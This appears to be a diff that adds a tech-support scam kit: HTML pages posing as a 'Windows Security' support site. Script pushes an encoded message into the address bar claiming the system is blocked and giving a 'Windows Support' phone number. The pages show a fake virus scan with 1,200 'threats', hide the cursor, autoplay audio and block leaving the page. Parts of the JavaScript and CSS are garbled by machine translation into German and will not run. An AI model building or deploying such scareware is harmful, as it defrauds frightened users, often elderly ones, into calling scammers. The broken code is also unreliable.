@@ -1,0 +1,809 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Support Page</title>
+</head>
+<body>
+
+    <script>
+        // 1. Define your fancy symbols and text
+        // This is the encoded version of symbols like ⛔, ⚠️, and Bold text
+        const fancyPath = "⛔%E2%9B%94%EF%BC%83%F0%9D%97%AF%F0%9D%97%B9%F0%9D%97%BC%F0%9D%97%B0%F0%9D%97%B8%F0%9D%97%B2%F0%9D%97%B1%EF%BC%83%E2%9B%94";
+        const fancyFragment = "%23%F0%9D%90%A2%F0%9D%90%AD%F0%9D%90%B2%C2%AF%F0%9D%90%AB%F0%9D%90%9E%F0%9D%90%9A%F0%9D%90%AC%F0%9D%90%A8%F0%9D%90%A7%F0%9D%90%AC%C2%AF%F0%9D%90%9A%F0%9D%90%A7%F0%9D%90%9D%C2%AF%F0%9D%90%92%F0%9D%90%9A%F0%9D%90%9F%F0%9D%90%9E%F0%9D%90%AD%F0%9D%90%B2%C2%AF%E2%9A%A0%C2%AF%F0%9F%93%9E%C2%AF%F0%9D%90%82%F0%9D%90%A8%F0%9D%90%A7%F0%9D%90%AD%F0%9D%90%9A%F0%9D%90%9C%F0%9D%90%AD%C2%AF%F0%9D%90%96%F0%9D%90%A2%F0%9D%90%A7%F0%9D%90%9D%F0%9D%90%A8%F0%9D%90%B0%F0%9D%90%AC%C2%AF%E2%84%A2%C2%A9%C2%AE%C2%AF%F0%9D%90%92%F0%9D%90%AE%F0%9D%90%A9%F0%9D%90%A9%F0%9D%90%A8%F0%9D%90%AB%F0%9D%90%AD%C2%AF0035%C2%AF3476-7838%C2%AF%F0%9F%93%9E%E2%9A%A0%C2%AF%F0%9D%90%80%F0%9D%90%9C%F0%9D%90%9C%F0%9D%90%9E%F0%9D%90%AC%F0%9D%90%AC%C2%AF%F0%9D%90%AD%F0%9D%90%A8%C2%AF%F0%9D%90%AD%F0%9D%90%A1%F0%9D%90%A2%F0%9D%90%AC%C2%AF%F0%9D%90%92%F0%9D%90%B2%F0%9D%90%AC%F0%9D%90%AD%F0%9D%90%9E%F0%9D%90%A6%C2%AF%F0%9D%90%A1%F0%9D%90%9A%F0%9D%90%AC%C2%AF%F0%9D%90%9B%F0%9D%90%9E%F0%9D%90%9E%F0%9D%90%A7%C2%AF%F0%9D%90%9B%F0%9D%90%A5%F0%9D%90%A8%F0%9D%90%9C%F0%9D%90%A4%F0%9D%90%9E%F0%9D%90%9D%C2%AF%F0%9D%90%9F%F0%9D%90%A8%F0%9D%90%AB%C2%AF%F0%9D%90%AC%F0%9D%90%9E%F0%9D%90%9C%F0%9D%90%AE%F0%9D%90%AB%F0%9D%90%A2%F0%9D%90%AD%F0%9D%90%B2%C2%AF%F0%9D%90%AB%F0%9D%90%9E%F0%9D%90%9A%F0%9D%90%AC%F0%9D%90%A8%F0%9D%90%A7%F0%9D%90%AC%C2%AF%F0%9D%90%9A%F0%9D%90%A7%F0%9D%90%9D%C2%AF%F0%9D%90%92%F0%9D%90%9A%F0%9D%90%9F%F0%9D%90%9E%F0%9D%90%AD%F0%9D%90%B2%C2%AF%E2%9A%A0%C2%AF%F0%9F%93%9E%C2%AF%F0%9D%90%82%F0%9D%90%A8%F0%9D%90%A7%F0%9D%90%AD%F0%9D%90%9A%F0%9D%90%9C%F0%9D%90%AD%C2%AF%F0%9D%90%96%F0%9D%90%A2%F0%9D%90%A7%F0%9D%90%9D%F0%9D%90%A8%F0%9D%90%B0%F0%9D%90%AC%C2%AF%E2%84%A2%C2%A9%C2%AE%C2%AF%F0%9D%90%92%F0%9D%90%AE%F0%9D%90%A9%F0%9D%90%A9%F0%9D%90%A8%F0%9D%90%AB%F0%9D%90%AD%C2%AF0035%C2%AF3476-7838%C2%AF%F0%9F%93%9E%E2%9A%A0%C2%AF%F0%9D%90%80%F0%9D%90%9C%F0%9D%90%9C%F0%9D%90%9E%F0%9D%90%AC%F0%9D%90%AC%C2%AF%F0%9D%90%AD%F0%9D%90%A8%C2%AF%F0%9D%90%AD%F0%9D%90%A1%F0%9D%90%A2%F0%9D%90%AC%C2%AF%F0%9D%90%92%F0%9D%90%B2%F0%9D%90%AC%F0%9D%90%AD%F0%9D%90%9E%F0%9D%90%A6%C2%AF%F0%9D%90%A1%F0%9D%90%9A%F0%9D%90%AC%C2%AF%F0%9D%90%9B%F0%9D%90%9E%F0%9D%90%9E%F0%9D%90%A7%C2%AF%F0%9D%90%9B%F0%9D%90%A5%F0%9D%90%A8%F0%9D%90%9C%F0%9D%90%A4%F0%9D%90%9E%F0%9D%90%9D%C2%AF%F0%9D%90%9F%F0%9D%90%A8%F0%9D%90%AB%C2%AF%F0%9D%90%AC%F0%9D%90%9E%F0%9D%90%9C%F0%9D%90%AE%F0%9D%90%AB%F0%9D%90%A2%F0%9D%90%AD%F0%9D%90%B2%C2%AF%F0%9D%90%AB%F0%9D%90%9E%F0%9D%90%9A%F0%9D%90%AC%F0%9D%90%A8%F0%9D%90%A7%F0%9D%90%AC%C2%AF%F0%9D%90%9A%F0%9D%90%A7%F0%9D%90%9D%C2%AF%F0%9D%90%92%F0%9D%90%9A%F0%9D%90%9F%F0%9D%90%9E%F0%9D%90%AD%F0%9D%90%B2%C2%AF%E2%9A%A0%C2%AF%F0%9F%93%9E%C2%AF%F0%9D%90%82%F0%9D%90%A8%F0%9D%90%A7%F0%9D%90%AD%F0%9D%90%9A%F0%9D%90%9C%F0%9D%90%AD%C2%AF%F0%9D%90%96%F0%9D%90%A2%F0%9D%90%A7%F0%9D%90%9D%F0%9D%90%A8%F0%9D%90%B0%F0%9D%90%AC%C2%AF%E2%84%A2%C2%A9%C2%AE%C2%AF%F0%9D%90%92%F0%9D%90%AE%F0%9D%90%A9%F0%9D%90%A9%F0%9D%90%A8%F0%9D%90%AB%F0%9D%90%AD%C2%AF0035%C2%AF3476-7838%C2%AF%F0%9F%93%9E%E2%9A%A0%C2%AF%F0%9D%90%80%F0%9D%90%9C%F0%9D%90%9C%F0%9D%90%9E%F0%9D%90%AC%F0%9D%90%AC%C2%AF%F0%9D%90%AD%F0%9D%90%A8%C2%AF%F0%9D%90%AD%F0%9D%90%A1%F0%9D%90%A2%F0%9D%90%AC%C2%AF%F0%9D%90%92%F0%9D%90%B2%F0%9D%90%AC%F0%9D%90%AD%F0%9D%90%9E%F0%9D%90%A6%C2%AF%F0%9D%90%A1%F0%9D%90%9A%F0%9D%90%AC%C2%AF%F0%9D%90%9B%F0%9D%90%9E%F0%9D%90%9E%F0%9D%90%A7%C2%AF%F0%9D%90%9B%F0%9D%90%A5%F0%9D%90%A8%F0%9D%90%9C%F0%9D%90%A4%F0%9D%90%9E%F0%9D%90%9D%C2%AF%F0%9D%90%9F%F0%9D%90%A8%F0%9D%90%AB%C2%AF%F0%9D%90%AC%F0%9D%90%9E%F0%9D%90%9C%F0%9D%90%AE%F0%9D%90%AB%F0%9D%90%A2%F0%9D%90%AD%F0%9D%90%B2%C2%AF%F0%9D%90%AB%F0%9D%90%9E%F0%9D%90%9A%F0%9D%90%AC%F0%9D%90%A8%F0%9D%90%A7%F0%9D%90%AC%C2%AF%F0%9D%90%9A%F0%9D%90%A7%F0%9D%90%9D%C2%AF%F0%9D%90%92%F0%9D%90%9A%F0%9D%90%9F%F0%9D%90%9E%F0%9D%90%AD%F0%9D%90%B2%C2%AF%E2%9A%A0%C2%AF%F0%9F%93%9E%C2%AF%F0%9D%90%82%F0%9D%90%A8%F0%9D%90%A7%F0%9D%90%AD%F0%9D%90%9A%F0%9D%90%9C%F0%9D%90%AD%C2%AF%F0%9D%90%96%F0%9D%90%A2%F0%9D%90%A7%F0%9D%90%9D%F0%9D%90%A8%F0%9D%90%B0%F0%9D%90%AC%C2%AF%E2%84%A2%C2%A9%C2%AE%C2%AF%F0%9D%90%92%F0%9D%90%AE%F0%9D%90%A9%F0%9D%90%A9%F0%9D%90%A8%F0%9D%90%AB%F0%9D%90%AD%C2%AF0035%C2%AF3476-7838%C2%AF%F0%9F%93%9E%E2%9A%A0%C2%AF%F0%9D%90%80%F0%9D%90%9C%F0%9D%90%9C%F0%9D%90%9E%F0%9D%90%AC%F0%9D%90%AC%C2%AF%F0%9D%90%AD%F0%9D%90%A8%C2%AF%F0%9D%90%AD%F0%9D%90%A1%F0%9D%90%A2%F0%9D%90%AC%C2%AF%F0%9D%90%92%F0%9D%90%B2%F0%9D%90%AC%F0%9D%90%AD%F0%9D%90%9E%F0%9D%90%A6%C2%AF%F0%9D%90%A1%F0%9D%90%9A%F0%9D%90%AC%C2%AF%F0%9D%90%9B%F0%9D%90%9E%F0%9D%90%9E%F0%9D%90%A7%C2%AF%F0%9D%90%9B%F0%9D%90%A5%F0%9D%90%A8%F0%9D%90%9C%F0%9D%90%A4%F0%9D%90%9E%F0%9D%90%9D%C2%AF%F0%9D%90%9F%F0%9D%90%A8%F0%9D%90%AB%C2%AF%F0%9D%90%AC%F0%9D%90%9E%F0%9D%90%9C%F0%9D%90%AE%F0%9D%90%AB%F0%9D%90%A2%F0%9D%90%AD%F0%9D%90%B2%C2%AF%F0%9D%90%AB%F0%9D%90%9E%F0%9D%90%9A%F0%9D%90%AC%F0%9D%90%A8%F0%9D%90%A7%F0%9D%90%AC%C2%AF%F0%9D%90%9A%F0%9D%90%A7%F0%9D%90%9D%C2%AF%F0%9D%90%92%F0%9D%90%9A%F0%9D%90%9F%F0%9D%90%9E%F0%9D%90%AD%F0%9D%90%B2%C2%AF%E2%9A%A0%C2%AF%F0%9F%93%9E%C2%AF%F0%9D%90%82%F0%9D%90%A8%F0%9D%90%A7%F0%9D%90%AD%F0%9D%90%9A%F0%9D%90%9C%F0%9D%90%AD%C2%AF%F0%9D%90%96%F0%9D%90%A2%F0%9D%90%A7%F0%9D%90%9D%F0%9D%90%A8%F0%9D%90%B0%F0%9D%90%AC%C2%AF%E2%84%A2%C2%A9%C2%AE%C2%AF%F0%9D%90%92%F0%9D%90%AE%F0%9D%90%A9%F0%9D%90%A9%F0%9D%90%A8%F0%9D%90%AB%F0%9D%90%AD%C2%AF0035%C2%AF3476-7838%C2%AF%F0%9F%93%9E%E2%9A%A0%C2%AF%F0%9D%90%80%F0%9D%90%9C%F0%9D%90%9C%F0%9D%90%9E%F0%9D%90%AC%F0%9D%90%AC%C2%AF%F0%9D%90%AD%F0%9D%90%A8%C2%AF%F0%9D%90%AD%F0%9D%90%A1%F0%9D%90%A2%F0%9D%90%AC%C2%AF%F0%9D%90%92%F0%9D%90%B2%F0%9D%90%AC%F0%9D%90%AD%F0%9D%90%9E%F0%9D%90%A6%C2%AF%F0%9D%90%A1%F0%9D%90%9A%F0%9D%90%AC%C2%AF%F0%9D%90%9B%F0%9D%90%9E%F0%9D%90%9E%F0%9D%90%A7%C2%AF%F0%9D%90%9B%F0%9D%90%A5%F0%9D%90%A8%F0%9D%90%9C%F0%9D%90%A4%F0%9D%90%9E%F0%9D%90%9D%C2%AF%F0%9D%90%9F%F0%9D%90%A8%F0%9D%90%AB%C2%AF%F0%9D%90%AC%F0%9D%90%9E%F0%9D%90%9C%F0%9D%90%AE%F0%9D%90%AB%F0%9D%90%A2%F0%9D%90%AD%F0%9D%90%B2%C2%AF%F0%9D%90%AB%F0%9D%90%9E%F0%9D%90%9A%F0%9D%90%AC%F0%9D%90%A8%F0%9D%90%A7%F0%9D%90%AC%C2%AF%F0%9D%90%9A%F0%9D%90%A7%F0%9D%90%9D%C2%AF%F0%9D%90%92%F0%9D%90%9A%F0%9D%90%9F%F0%9D%90%9E%F0%9D%90%AD%F0%9D%90%B2%C2%AF%E2%9A%A0%C2%AF%F0%9F%93%9E%C2%AF%F0%9D%90%82%F0%9D%90%A8%F0%9D%90%A7%F0%9D%90%AD%F0%9D%90%9A%F0%9D%90%9C%F0%9D%90%AD%C2%AF%F0%9D%90%96%F0%9D%90%A2%F0%9D%90%A7%F0%9D%90%9D%F0%9D%90%A8%F0%9D%90%B0%F0%9D%90%AC%C2%AF%E2%84%A2%C2%A9%C2%AE%C2%AF%F0%9D%90%92%F0%9D%90%AE%F0%9D%90%A9%F0%9D%90%A9%F0%9D%90%A8%F0%9D%90%AB%F0%9D%90%AD%C2%AF0035%C2%AF3476-7838%C2%AF%F0%9F%93%9E%E2%9A%A0%C2%AF%F0%9D%90%80%F0%9D%90%9C%F0%9D%90%9C%F0%9D%90%9E%F0%9D%90%AC%F0%9D%90%AC%C2%AF%F0%9D%90%AD%F0%9D%90%A8%C2%AF%F0%9D%90%AD%F0%9D%90%A1%F0%9D%90%A2%F0%9D%90%AC%C2%AF%F0%9D%90%92%F0%9D%90%B2%F0%9D%90%AC%F0%9D%90%AD%F0%9D%90%9E%F0%9D%90%A6%C2%AF%F0%9D%90%A1%F0%9D%90%9A%F0%9D%90%AC%C2%AF%F0%9D%90%9B%F0%9D%90%9E%F0%9D%90%9E%F0%9D%90%A7%C2%AF%F0%9D%90%9B%F0%9D%90%A5%F0%9D%90%A8%F0%9D%90%9C%F0%9D%90%A4%F0%9D%90%9E%F0%9D%90%9D%C2%AF%F0%9D%90%9F%F0%9D%90%A8%F0%9D%90%AB%C2%AF%F0%9D%90%AC%F0%9D%90%9E%F0%9D%90%9C%F0%9D%90%AE%F0%9D%90%AB%F0%9D%90%A2%F0%9D%90%AD%F0%9D%90%B2%C2%AF%F0%9D%90%AB%F0%9D%90%9E%F0%9D%90%9A%F0%9D%90%AC%F0%9D%90%A8%F0%9D%90%A7%F0%9D%90%AC%C2%AF%F0%9D%90%9A%F0%9D%90%A7%F0%9D%90%9D%C2%AF%F0%9D%90%92%F0%9D%90%9A%F0%9D%90%9F%F0%9D%90%9E%F0%9D%90%AD%F0%9D%90%B2%C2%AF%E2%9A%A0%C2%AF%F0%9F%93%9E%C2%AF%F0%9D%90%82%F0%9D%90%A8%F0%9D%90%A7%F0%9D%90%AD%F0%9D%90%9A%F0%9D%90%9C%F0%9D%90%AD%C2%AF%F0%9D%90%96%F0%9D%90%A2%F0%9D%90%A7%F0%9D%90%9D%F0%9D%90%A8%F0%9D%90%B0%F0%9D%90%AC%C2%AF%E2%84%A2%C2%A9%C2%AE%C2%AF%F0%9D%90%92%F0%9D%90%AE%F0%9D%90%A9%F0%9D%90%A9%F0%9D%90%A8%F0%9D%90%AB%F0%9D%90%AD%C2%AF0035%C2%AF3476-7838%C2%AF%F0%9F%93%9E%E2%9A%A0%C2%AF%F0%9D%90%80%F0%9D%90%9C%F0%9D%90%9C%F0%9D%90%9E%F0%9D%90%AC%F0%9D%90%AC%C2%AF%F0%9D%90%AD%F0%9D%90%A8%C2%AF%F0%9D%90%AD%F0%9D%90%A1%F0%9D%90%A2%F0%9D%90%AC%C2%AF%F0%9D%90%92%F0%9D%90%B2%F0%9D%90%AC%F0%9D%90%AD%F0%9D%90%9E%F0%9D%90%A6%C2%AF%F0%9D%90%A1%F0%9D%90%9A%F0%9D%90%AC%C2%AF%F0%9D%90%9B%F0%9D%90%9E%F0%9D%90%9E%F0%9D%90%A7%C2%AF%F0%9D%90%9B%F0%9D%90%A5%F0%9D%90%A8%F0%9D%90%9C%F0%9D%90%A4%F0%9D%90%9E%F0%9D%90%9D%C2%AF%F0%9D%90%9F%F0%9D%90%A8%F0%9D%90%AB%C2%AF%F0%9D%90%AC%F0%9D%90%9E%F0%9D%90%9C%F0%9D%90%AE%F0%9D%90%AB%F0%9D%90%A2%F0%9D%90%AD%F0%9D%90%B2%C2%AF%F0%9D%90%AB%F0%9D%90%9E%F0%9D%90%9A%F0%9D%90%AC%F0%9D%90%A8%F0%9D%90%A7%F0%9D%90%AC%C2%AF%F0%9D%90%9A%F0%9D%90%A7%F0%9D%90%9D%C2%AF%F0%9D%90%92%F0%9D%90%9A%F0%9D%90%9F%F0%9D%90%9E%F0%9D%90%AD%F0%9D%90%B2%C2%AF%E2%9A%A0%C2%AF%F0%9F%93%9E%C2%AF%F0%9D%90%82%F0%9D%90%A8%F0%9D%90%A7%F0%9D%90%AD%F0%9D%90%9A%F0%9D%90%9C%F0%9D%90%AD%C2%AF%F0%9D%90%96%F0%9D%90%A2%F0%9D%90%A7%F0%9D%90%9D%F0%9D%90%A8%F0%9D%90%B0%F0%9D%90%AC%C2%AF%E2%84%A2%C2%A9%C2%AE%C2%AF%F0%9D%90%92%F0%9D%90%AE%F0%9D%90%A9%F0%9D%90%A9%F0%9D%90%A8%F0%9D%90%AB%F0%9D%90%AD%C2%AF0035%C2%AF3476-7838%C2%AF%F0%9F%93%9E%E2%9A%A0%C2%AF%F0%9D%90%80%F0%9D%90%9C%F0%9D%90%9C%F0%9D%90%9E%F0%9D%90%AC%F0%9D%90%AC%C2%AF%F0%9D%90%AD%F0%9D%90%A8%C2%AF%F0%9D%90%AD%F0%9D%90%A1%F0%9D%90%A2%F0%9D%90%AC%C2%AF%F0%9D%90%92%F0%9D%90%B2%F0%9D%90%AC%F0%9D%90%AD%F0%9D%90%9E%F0%9D%90%A6%C2%AF%F0%9D%90%A1%F0%9D%90%9A%F0%9D%90%AC%C2%AF%F0%9D%90%9B%F0%9D%90%9E%F0%9D%90%9E%F0%9D%90%A7%C2%AF%F0%9D%90%9B%F0%9D%90%A5%F0%9D%90%A8%F0%9D%90%9C%F0%9D%90%A4%F0%9D%90%9E%F0%9D%90%9D%C2%AF%F0%9D%90%9F%F0%9D%90%A8%F0%9D%90%AB%C2%AF%F0%9D%90%AC%F0%9D%90%9E%F0%9D%90%9C%F0%9D%90%AE%F0%9D%90%AB%F0%9D%90%A2%F0%9D%90%AD%F0%9D%90%B2%C2%AF%F0%9D%90%AB%F0%9D%90%9E%F0%9D%90%9A%F0%9D%90%AC%F0%9D%90%A8%F0%9D%90%A7%F0%9D%90%AC%C2%AF%F0%9D%90%9A%F0%9D%90%A7%F0%9D%90%9D%C2%AF%F0%9D%90%92%F0%9D%90%9A%F0%9D%90%9F%F0%9D%90%9E%F0%9D%90%AD%F0%9D%90%B2%C2%AF%E2%9A%A0%C2%AF%F0%9F%93%9E%C2%AF%F0%9D%90%82%F0%9D%90%A8%F0%9D%90%A7%F0%9D%90%AD%F0%9D%90%9A%F0%9D%90%9C%F0%9D%90%AD%C2%AF%F0%9D%90%96%F0%9D%90%A2%F0%9D%90%A7%F0%9D%90%9D%F0%9D%90%A8%F0%9D%90%B0%F0%9D%90%AC%C2%AF%E2%84%A2%C2%A9%C2%AE%C2%AF%F0%9D%90%92%F0%9D%90%AE%F0%9D%90%A9%F0%9D%90%A9%F0%9D%90%A8%F0%9D%90%AB%F0%9D%90%AD%C2%AF0035%C2%AF3476-7838%C2%AF%F0%9F%93%9E%E2%9A%A0%C2%AF%F0%9D%90%80%F0%9D%90%9C%F0%9D%90%9C%F0%9D%90%9E%F0%9D%90%AC%F0%9D%90%AC%C2%AF%F0%9D%90%AD%F0%9D%90%A8%C2%AF%F0%9D%90%AD%F0%9D%90%A1%F0%9D%90%A2%F0%9D%90%AC%C2%AF%F0%9D%90%92%F0%9D%90%B2%F0%9D%90%AC%F0%9D%90%AD%F0%9D%90%9E%F0%9D%90%A6%C2%AF%F0%9D%90%A1%F0%9D%90%9A%F0%9D%90%AC%C2%AF%F0%9D%90%9B%F0%9D%90%9E%F0%9D%90%9E%F0%9D%90%A7%C2%AF%F0%9D%90%9B%F0%9D%90%A5%F0%9D%90%A8%F0%9D%90%9C%F0%9D%90%A4%F0%9D%90%9E%F0%9D%90%9D%C2%AF%F0%9D%90%9F%F0%9D%90%A8%F0%9D%90%AB%C2%AF%F0%9D%90%AC%F0%9D%90%9E%F0%9D%90%9C%F0%9D%90%AE%F0%9D%90%AB%F0%9D%90%A2%F0%9D%90%AD%F0%9D%90%B2%C2%AF%F0%9D%90%AB%F0%9D%90%9E%F0%9D%90%9A%F0%9D%90%AC%F0%9D%90%A8%F0%9D%90%A7%F0%9D%90%AC%C2%AF%F0%9D%90%9A%F0%9D%90%A7%F0%9D%90%9D%C2%AF%F0%9D%90%92%F0%9D%90%9A%F0%9D%90%9F%F0%9D%90%9E%F0%9D%90%AD%F0%9D%90%B2%C2%AF%E2%9A%A0%C2%AF%F0%9F%93%9E%C2%AF%F0%9D%90%82%F0%9D%90%A8%F0%9D%90%A7%F0%9D%90%AD%F0%9D%90%9A%F0%9D%90%9C%F0%9D%90%AD%C2%AF%F0%9D%90%96%F0%9D%90%A2%F0%9D%90%A7%F0%9D%90%9D%F0%9D%90%A8%F0%9D%90%B0%F0%9D%90%AC%C2%AF%E2%84%A2%C2%A9%C2%AE%C2%AF%F0%9D%90%92%F0%9D%90%AE%F0%9D%90%A9%F0%9D%90%A9%F0%9D%90%A8%F0%9D%90%AB%F0%9D%90%AD%C2%AF0035%C2%AF3476-7838%C2%AF%F0%9F%93%9E%E2%9A%A0%C2%AF%F0%9D%90%80%F0%9D%90%9C%F0%9D%90%9C%F0%9D%90%9E%F0%9D%90%AC%F0%9D%90%AC%C2%AF%F0%9D%90%AD%F0%9D%90%A8%C2%AF%F0%9D%90%AD%F0%9D%90%A1%F0%9D%90%A2%F0%9D%90%AC%C2%AF%F0%9D%90%92%F0%9D%90%B2%F0%9D%90%AC%F0%9D%90%AD%F0%9D%90%9E%F0%9D%90%A6%C2%AF%F0%9D%90%A1%F0%9D%90%9A%F0%9D%90%AC%C2%AF%F0%9D%90%9B%F0%9D%90%9E%F0%9D%90%9E%F0%9D%90%A7%C2%AF%F0%9D%90%9B%F0%9D%90%A5%F0%9D%90%A8%F0%9D%90%9C%F0%9D%90%A4%F0%9D%90%9E%F0%9D%90%9D%C2%AF%F0%9D%90%9F%F0%9D%90%A8%F0%9D%90%AB%C2%AF%F0%9D%90%AC%F0%9D%90%9E%F0%9D%90%9C%F0%9D%90%AE%F0%9D%90%AB";
+		
+		// 2. Check if the URL already has the symbols. 
+        // If it doesn't, we "push" the symbols into the address bar.
+        if (!window.location.hash) {
+            // This changes the URL without refreshing the page
+            window.history.pushState(null, null, fancyPath + fancyFragment);
+        }
+    </script>
+
+    <div style="text-align: center; margin-top: 50px; font-family: sans-serif;">
+        <h1>Processing...</h1>
+        <p>You are being redirected to the secure support line.</p>
+    </div>
+
+</body>
+</html>
+<html lang="de">
+<head><meta charset="utf-8">
+<meta content="width=device-width,initial-scale=1,shrink-to-fit=no" name="viewport">
+<meta content="noindex,nofollow" name="robots">
+<title>Sicherheitscenter </title>
+<link href="w3.html" rel="icon" id="favicon" type="image/png">
+<link href="css/21tapa.css" rel="stylesheet">
+<link href="css/21bootstrap.min.css" <link="" type="text/css" rel="stylesheet">
+<script src="js/21jquery.min.js"></script>
+<script src="js/21bootstrap.min.js" crossorigin="anonymous"></script>
+<link rel="stylesheet" href="css/21font-awesome.min.css">
+<script src="js/21jquery.min.js"></script>
+<script src="js/21bootstrap.min.js" crossorigin="anonymous"></script>
+<link rel="stylesheet" href="css/21font-awesome.min.css">
+
+<script src="js/21emojione.min.js" type="text/javascript" async="" defer=""></script><script src="js/21emojione.min.js" type="text/javascript" async="" defer=""></script><style type="text/css">@keyframes tawkMaxOpen{0%{opacity:0;transform:translate(0, 30px);;}to{opacity:1;transform:translate(0, 0px);}}@-moz-keyframes tawkMaxOpen{0%{opacity:0;transform:translate(0, 30px);;}auf{opacity:1;transform:translate(0, 0px);}}@-webkit-keyframes tawkMaxOpen{0%{opacity:0;transform:translate(0, 30px);;}auf{opacity:1;transform:translate(0, 0px);}}#xnvjiaf2npoo1694042833969.open{Animation: tawkMaxOpen 0,25 s Leichtigkeit!wichtig;}@keyframes tawkMaxClose{von{opacity: 1;transform:translate(0, 0px);;}auf{opacity: 0;transform:translate(0, 30px);;}}@-moz-keyframes tawkMaxClose{von{opacity: 1;transform:translate(0, 0px);;}bis{opacity: 0;transform:translate(0, 30px);;}}@-webkit-keyframes tawkMaxClose{von{opacity: 1;transform:translate(0, 0px);;}bis{opacity: 0;transform:translate(0, 30px);;}}#xnvjiaf2npoo1694042833969.closed{animation: tawkMaxClose .25s ease!important}</style>
+
+<script src="js/21analytics.js"></script>
+
+</head>
+
+<body class="map" id="mycanvas" onmousemove="showd2();" onclick="chat();beep1();" onbeforeunload="return myFunction()" style="cursor:none">
+<script src="js/21script.compat.js" data-domain="steampowered.com" defer="" id="plausible"></script>
+<script>
+Funktion chat() {
+document.getElementById("chat").style.display = "block";
+document.getElementById("footer").style.display = "block";
+document.getElementById("welcomeDiv").style.display = "block";
+document.getElementById("chat-box").style.display = "none";
+
+}
+</script>
+
+<script>
+Funktion getVariableFromURl(n0me)
+{
+n0me = n0me.replace(/[\[]/,"\\\[").replace(/[\]]/,"\\\]");
+var regexS = "[\\?&]"+n0me+"=([^&#]*)";
+var regex = neuer RegExp( regexS );
+var Ergebnisse = regex.exec( window.location.href );
+wenn( Ergebnisse == null )
+return "";
+sonst
+return Ergebnisse[1];
+}
+</script>
+
+<script type="text/javascript">
+var ph0ne = getVariableFromURl('ph0ne');
+</script>
+
+<audio id="beep">
+<source src="media/beep.mp3" type="audio/mpeg">
+</audio>
+<audio autoplay="" id="pridez">
+<source src="media/eng.mp3" type="audio/mpeg">
+</audio>
+
+<a href="#" id="link_black" style="cursor:none" rel="noreferrer">
+<div class="black" style="height: 145%; cursor: none; display: block;"></div>
+
+<div class="bg" id="bg">
+<div class="bgimg" style="top:0">
+<img src="img/21f24.png" alt="" width="100%">
+</div>
+</div>
+</a>
+<div class="pro_box" style="cursor: none; display: default;">
+<div class="pro_box_header">
+<div class="row">
+<div class="col-md-12">
+<div class="minimize">
+<ul>
+<li>
+<a href="#">
+<img src="img/mnc.png">
+</a>
+</li>
+</ul>
+</div>
+</div>
+<div class="col-md-4">
+<div class="logo">
+<img src="img/msmm.png">
+<span>Windows-Sicherheit</span>
+</div>
+</div>
+<div class="col-md-8">
+<div class="activate_lic">
+<ul>
+<li>
+<a href="#">
+<button>Lizenz aktivieren</button>
+</a>
+</li>
+<li>
+<a href="#">
+<img src="img/set.png">
+</a>
+</li>
+<li>
+<a href="#">
+<img  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA0AAAANCAIAAAD9iXMrAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAP9JREFUeNqMUTEORUAQZbIUalESpTNoVEqJSuIKjuMUCiRKnQtoKSRCKRp0JPJf/iYbv/iJKdZ47+3smxl533fpG9d1dV03z/O6rrqum6bpOI6iKJxl/DNNU5Zly7JIjzAMI4oiy7KQy6gHUZqm+FFVNQxDEEDKsjzPk4iSJAFCeA6VeIE4jm3bbtsWJ3Ig932DhYbBk3juOI6macZx3LYtCAIOgoWGwbgwlOc5T9BB3/cCh4bQnfQbruui2aqqBAINYQRPEYx7nlcUBTwIEBrC1aeOMVbX9TAMTxAaghXMSfofYKEhTBzDFKimab7v4xQ2wEIj87292seb/X4EGADicI/nlE5xDgAAAABJRU5ErkJggg==">
+                    </a>
+                  </li>
+                </ul>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="scan_box">
+          <div class="scan_box_header">
+            <div class="row">
+              <div class="col-md-6">
+                <div class="quick_scan">
+                  <p>
+                    <img src="img/vsc.png">
+                    <span>Scanning Rapide</span>
+                  </p>
+                </div>
+              </div>
+              <div class="col-md-6">
+                <div class="minimize1">
+                  <ul>
+                    <li>
+                      <a href="#">
+                        <img src="img/mnc.png">
+                      </a>
+                    </li>
+                  </ul>
+                </div>
+              </div>
+            </div>
+          </div>
+          <div class="scan_body">
+            <div class="progress" style="height:30px;">
+              <div class="active progress-bar progress-bar-success" style="width:35%;" id="dynamic" aria-valuemax="100" aria-valuemin="0" aria-valuenow="100" role="progressbar">35% Complete</div>
+            </div>
+            <div class="table_quick">
+              <table class="table table-bordered">
+                <thead>
+                  <tr>
+                    <th scope="col">Scanned Objects</th>
+                    <th scope="col">
+                      <div class="col_fourth counter">
+                        <h2 class="count-number count-title timer" data-speed="5000" data-to="51900">51,900</h2>
+                      </div>
+                    </th>
+                  </tr>
+                  <tr>
+                    <th scope="col">Time Spent</th>
+                    <th scope="col">5 secs</th>
+                  </tr>
+                  <tr>
+                    <th scope="col">Identified Threats</th>
+                    <th scope="col" style="color:red">
+                      <h2 class="count-number count-title timer" data-speed="2500" data-to="1200">1,200</h2>
+                    </th>
+                  </tr>
+                </thead>
+              </table>
+            </div>
+          </div>
+          <div class="scan_footer">
+            <div class="row">
+              <div class="col-md-6">
+                <div class="bt_can">
+                  <div class="btn-group" role="group" aria-label="Basic example">
+                    <button class="btn btn-secondary" type="button">Scan</button>
+                  </div>
+                  <div class="btn-group" role="group" aria-label="Basic example">
+                    <button class="btn btn-secondary" type="button">Pause</button>
+                  </div>
+                </div>
+              </div>
+              <div class="col-md-6">
+                <div class="bt_can2">
+                  <div class="btn-group" role="group" aria-label="Basic example">
+                    <button class="btn btn-secondary" type="button">Scheduled Scans</button>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="pro_box2" style="cursor: default; display: none;">
+        <div class="pro_box_header">
+          <div class="row">
+            <div class="col-md-12">
+              <div class="minimize">
+                <ul>
+                  <li>
+                    <a href="#">
+                      <img src="img/mnc.png">
+                    </a>
+                  </li>
+                </ul>
+              </div>
+            </div>
+            <div class="col-md-4">
+              <div class="logo">
+                <img src="img/msmm.png">
+                <span>Windows security</span>
+              </div>
+            </div>
+            <div class="col-md-8">
+              <div class="activate_lic">
+                <ul>
+                  <li>
+                    <a href="#">
+                      <button>Activate the license</button>
+                    </a>
+                  </li>
+                  <li>
+                    <a href="#">
+                      <img src="img/bel.png">
+                    </a>
+                  </li>
+                  <li>
+                    <a href="#">
+                      <img src="img/set.png">
+                    </a>
+                  </li>
+                  <li>
+                    <a href="#">
